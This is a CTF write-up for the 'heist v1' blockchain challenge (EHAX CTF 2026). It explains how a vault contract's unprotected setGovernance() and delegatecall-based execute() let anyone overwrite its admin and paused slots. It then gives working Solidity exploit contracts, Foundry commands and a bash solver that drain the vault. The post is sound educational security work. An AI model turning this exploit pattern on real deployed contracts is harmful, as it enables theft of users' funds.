---
title: "[Blockchain] heist v1"
description: Writeup for "heist v1" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Blockchain]
toc: true
comments: false
---

# heist v1 (EHAX CTF 2026)

---

- **Name:** heist v1
- **Category:** Blockchain
- **Description:** the government has released a new vault and now we can add proposals too , what?? , drain the VAULT
- **Difficulty:** ★☆☆☆☆

---
<img width="350" height="224" alt="image" src="https://github.com/user-attachments/assets/dd40e08d-eeda-44a6-b41a-2a824fc5593e" />
---

# HEIST v1 (486) — Writeup

> Target: drain the `Vault` contract balance to `0` (so `isSolved()` becomes `true`).

---

## TL;DR

- `Vault.setGovernance()` has **no access control** → anyone can set `governance`.
- `Vault.execute(bytes)` has **no access control** and uses **`delegatecall`**.
- With `delegatecall`, an attacker can run their own code **in the Vault’s storage context**.
- We overwrite:
  - `slot0` → `paused = false`
  - `slot1` → `admin = attacker-controlled address`
- Then call `withdraw()` to drain the vault.

---

## Overview

The challenge gives two Solidity files:

- `Vault.sol` (holds ETH and has `withdraw()`)
- `Governance.sol` (a simple contract)

The `Vault` starts in a locked state:

- `paused = true`
- `withdraw()` requires:
  - `paused == false`
  - `msg.sender == admin`

So normally, you cannot withdraw.

---

## Solution

### 1) Recon

Key parts of `Vault.sol`:

```solidity
function withdraw() public {
    require(!paused, "paused");
    require(msg.sender == admin, "not admin");
    payable(msg.sender).transfer(address(this).balance);
}

function setGovernance(address _g) public {
    governance = _g;
}

function execute(bytes calldata data) public {
    (bool ok,) = governance.delegatecall(data);
    require(ok);
}
```

Observations:

1. `setGovernance(address)` is **public** with **no modifier** → anyone can change `governance`.
2. `execute(bytes)` is **public** with **no modifier** → anyone can trigger a `delegatecall`.
3. `delegatecall` executes external code but writes to **Vault storage**.

That combination is usually game over.

---

### 2) Root cause

There are two root causes:

#### (A) Missing access control
- `setGovernance()` should be restricted (e.g., `onlyOwner`).
- `execute()` should also be restricted.

#### (B) Dangerous `delegatecall` to attacker-controlled address
Because `governance` can be set by anyone, the attacker can point it to a malicious contract.

**`delegatecall` rule (simple version):**
- Code comes from the callee (`governance`)
- BUT storage and balance belong to the caller (`Vault`)

So if we can make Vault delegatecall into our contract, we can modify Vault’s variables directly.

---

### 3) Exploit

#### Goal
Make these checks pass:

- `!paused`
- `msg.sender == admin`

We do it by overwriting Vault storage slots.

Vault storage layout (important idea, simplified):

- **slot0**: `paused` + `fee` (packed)
- **slot1**: `admin`
- **slot2**: `governance`

So we want:
- `slot0 = 0` → `paused = false` (and `fee = 0`, not important)
- `slot1 = attacker` → become admin

#### Malicious governance contract

```solidity
// EvilGovernance.sol
pragma solidity ^0.8.20;

contract EvilGovernance {
    function pwn() external {
        assembly {
            sstore(0, 0)         // slot0 = 0  => paused=false
            sstore(1, caller())  // slot1 = caller() => admin=caller
        }
    }
}
```

- When Vault runs `delegatecall(pwn())`, the `sstore()` writes to **Vault’s** slots.

#### One-transaction “Attack” helper

This challenge had unstable RPC ports, so it helped to do everything in one deployment transaction.

```solidity
// Attack.sol
pragma solidity ^0.8.20;

interface IVault {
    function setGovernance(address _g) external;
    function execute(bytes calldata data) external;
    function withdraw() external;
}

contract Attack {
    constructor(address vault, address evil) {
        IVault(vault).setGovernance(evil);
        IVault(vault).execute(abi.encodeWithSignature("pwn()"));
        IVault(vault).withdraw();
    }

    receive() external payable {}
}
```

What happens during deployment of `Attack`:

1. Set Vault governance to `evil`
2. Call `execute(pwn())` → overwrites `paused` and `admin`
3. Call `withdraw()` → drains Vault balance

#### Commands (Foundry)

> Note: the RPC service used by this challenge sometimes changed the port.  
> Always re-check the current `RPC_URL` from the challenge server.

```bash
# variables from nc output
export RPC_URL="http://<host>:<port>"
export VAULT="0x..."
export PK="0x..."

# init project
mkdir -p heist && cd heist
forge init

# put EvilGovernance.sol and Attack.sol into src/
forge build

# deploy EvilGovernance (MUST be deployed on the CURRENT RPC instance)
EVIL=$(forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast   src/EvilGovernance.sol:EvilGovernance | awk '/Deployed to:/ {print $3}')

echo "EVIL=$EVIL"

# deploy Attack (drains Vault in the constructor)
forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast   src/Attack.sol:Attack   --constructor-args "$VAULT" "$EVIL"
```

After that, use the challenge menu option “Check solved” to get the real flag.

---

### 4) Why it works

1. **We can change governance**
   - `setGovernance()` is public and has no permission checks.
   - So we point governance to our malicious contract.

2. **We can make Vault run our code**
   - `execute(bytes)` is also public.
   - It calls `governance.delegatecall(data)`.

3. **delegatecall writes to Vault storage**
   - In `EvilGovernance.pwn()`, `sstore(0,0)` and `sstore(1,caller())` modify Vault’s slots.
   - This flips `paused` to `false` and sets `admin` to our chosen caller (the `Attack` contract).

4. **Now withdraw passes**
   - `paused` is false → first require passes
   - `msg.sender` is the Attack contract, and we set `admin` to the Attack contract → second require passes
   - Vault transfers its full balance out → `isSolved()` becomes true.

---

## Solver

A minimal solver flow:

1. Get the latest `RPC_URL`, `VAULT`, and `PK` from `nc`.
2. Deploy `EvilGovernance` on that RPC.
3. Deploy `Attack(vault, evil)` on that RPC.
4. Click “Check solved”.

If the RPC port changes, repeat steps 1–3 (because contracts deployed on the old RPC instance may not exist on the new one).

---

### Optional: quick bash helper

```bash
#!/usr/bin/env bash
set -euo pipefail

RPC_URL="$1"
VAULT="$2"
PK="$3"

forge build

EVIL=$(forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast   src/EvilGovernance.sol:EvilGovernance | awk '/Deployed to:/ {print $3}')

forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast   src/Attack.sol:Attack   --constructor-args "$VAULT" "$EVIL"

echo "[+] Done. Now check solved in the nc menu."
```

Save as `solve.sh` and run:
```bash
chmod +x solve.sh
./solve.sh "http://<host>:<port>" "0xVault" "0xPrivateKey"
```

---

### Security lesson

- Never expose `delegatecall` to untrusted or user-controlled addresses.
- Always restrict admin functions with proper access control (e.g., `onlyOwner`).
- Be very careful with upgrade patterns: the implementation must be trusted and governance changes must be protected.

---
<img width="895" height="853" alt="image" src="https://github.com/user-attachments/assets/8ae302aa-cb6b-44ad-98d6-defb86d5530d" />
---
